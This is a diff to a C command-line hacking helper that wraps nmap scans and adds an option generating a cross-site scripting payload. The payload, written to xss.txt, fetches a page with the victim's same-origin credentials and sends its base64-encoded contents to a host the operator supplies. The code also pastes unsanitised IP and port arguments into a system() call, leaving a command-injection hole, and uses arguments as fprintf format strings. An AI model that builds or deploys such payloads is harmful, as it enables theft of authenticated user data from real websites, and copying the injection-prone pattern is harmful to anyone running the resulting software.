@@ -382,7 +382,7 @@ int main(int argc,char* argv[])
         }
         else if(strcmp(argv[1], "-xs") == 0)
         {
-            printf("You must create a server,then give the ip and the port of the server and the ip and the port of the target\n");
+            printf("You must give the file you want to read from the server and its ip address\n");
         }
         else if(strcmp(argv[1], "-xm") == 0)
         {
@@ -401,7 +401,7 @@ int main(int argc,char* argv[])
             ip=argv[2];
             strcpy(full_command,"nmap -sC -sV -v ");
             strcat (full_command, ip);
-            //executing the full comand which is nmap -sC -sV -v <ip_address>
+            //executing the full_comand
             system(full_command);
         }
         else if(strcmp(argv[1], "-sP") == 0)
@@ -541,13 +541,7 @@ int main(int argc,char* argv[])
         }
         else if(strcmp(argv[1], "-xs") == 0)
         {
-            FILE *fptr;
-            // Open a file in writing mode
-            fptr = fopen("filename.txt", "w");
-            char *number=argv[2];
-            //data for xss will be put here
-            fprintf(fptr,"");
-            fclose(fptr);
+            printf("give the ip address\n");
 
         }
         else if(strcmp(argv[1], "-xm") == 0)
@@ -591,5 +585,42 @@ int main(int argc,char* argv[])
             }
         }
     }
+    else if (argc==4)
+    {
+        if(strcmp(argv[1], "-sP") == 0)
+        {
+            //storing in a pointer the address of the argv[2]
+            ip=argv[2];
+            port=argv[3];
+            strcpy(full_command,"nmap -sC -sV -v ");
+            strcat (full_command, ip);
+            strcat(full_command," ");
+            strcat(full_command,"-p ");
+            strcat(full_command,port);
+            system(full_command);
+        }
+        else if(strcmp(argv[1], "-xs") == 0)
+        {
+            FILE *fptr;
+            //opening the xss.txt file in write mode
+            fptr=fopen("xss.txt","w");
+            //we put the data we need
+            fprintf(fptr,"<script>\nfetch(\"/");
+            fprintf(fptr,argv[2]);
+            fprintf(fptr,"\", {method:'GET',mode:'no-cors',credentials:'same-origin'})\n\t.then(response => response.text())\n\t.then(text => { \n\t\tfetch('http://");
+            fprintf(fptr,argv[3]);
+            fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>");
+            fclose(fptr);
+        }
+        else
+        {
+            printf("Too many arguments\n");
+        }
+    }
+    else
+    {
+        printf("Too many argumrnts\n");
+    }
+    
     return 0;
 }
